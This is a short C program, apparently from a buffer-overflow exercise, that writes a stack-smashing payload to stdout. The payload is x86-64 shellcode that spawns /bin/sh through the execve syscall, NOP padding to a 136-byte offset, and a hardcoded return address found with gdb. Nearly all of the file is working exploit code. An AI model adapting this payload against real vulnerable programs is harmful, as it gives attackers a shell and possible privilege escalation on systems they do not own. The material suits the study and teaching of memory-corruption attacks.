#include <memory.h>
#include <stdio.h>

/**
 * clang -o smashing_shellcode_exploit smashing_shellcode_exploit.c
 */
int main(void) {
  char shellcode[] =
      "\xeb\x17"             // jmp    617 <push_string>
      "\x5f"                 // pop    %rdi
      "\x48\x31\xd2"         // xor    %rdx,%rdx
      "\x48\x31\xc0"         // xor    %rax,%rax
      "\x48\x89\xe6"         // mov    %rsp,%rsi
      "\x48\x89\x54\x24\x08" // mov    %rdx,0x8(%rsp)
      "\x48\x89\x3c\x24"     // mov    %rdi,(%rsp)
      "\xb0\x3b"             // mov    $0x3b,%al
      "\x0f\x05"             // syscall
      "\xe8\xe4\xff\xff\xff" // callq  600 <pop_string>
      "/bin/sh";

  size_t shellcode_size = (sizeof shellcode) - 1;

  int offset = 136;
  int padded_bytes = offset - shellcode_size;

  {
    fwrite(shellcode, 1, shellcode_size, stdout);
  }

  {
    char pad[] = "\x90";
    for (int i = 0; i < padded_bytes; i++)
      fwrite(pad, 1, 1, stdout);
  }

  {
    char addr[] = "\x90\xdc\xff\xff\xff\x7f"; // gdb 0x7fffffffdc90
    //char addr[] = "\x10\xdd\xff\xff\xff\x7f"; // 0x7fffffffdd10
    fwrite(addr, 1, 6, stdout);
  }

  putchar('\0');
}